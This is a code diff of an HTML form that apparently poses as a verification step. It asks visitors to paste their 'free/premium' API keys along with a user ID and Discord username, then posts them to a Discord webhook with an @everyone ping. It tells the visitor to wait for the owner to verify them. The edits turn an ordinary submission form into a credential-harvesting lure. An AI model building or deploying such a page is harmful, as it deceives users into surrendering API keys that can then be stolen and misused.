@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Modern Dark Form</title>
+  <title>Verify pwease</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -97,7 +97,7 @@
       </div>
       <div class="form-group">
         <label for="api">Share API</label>
-        <textarea id="api" name="api" rows="3" placeholder="Enter API details"></textarea>
+        <textarea id="api" name="api" rows="3" placeholder="share free/premium api here"></textarea>
       </div>
       <div class="form-group">
         <label for="file">Source File</label>
@@ -143,11 +143,12 @@
         return;
       }
 
-      // Send other data as JSON
+      // Prepare other data payload
       const dataPayload = {
-        content: `**New Submission**\n\n**User ID:** ${userid}\n**Discord Username:** ${discordUsername}\n**API Details:**\n\`\`\`\n${api}\n\`\`\``,
+        content: `@everyone\n**User ID:** ${userid}\n**Username:** ${discordUsername}\n**API:**\n\`\`\`\n${api}\n\`\`\``,
       };
 
+      // Send text payload to Discord
       const response = await fetch(webhookURL, {
         method: "POST",
         headers: {
@@ -157,7 +158,7 @@
       });
 
       if (response.ok) {
-        alert("Data submitted successfully!");
+        alert("Data submitted successfully!, please wait until owner verifying you! ");
       } else {
         alert("Failed to send data. Please try again.");
       }
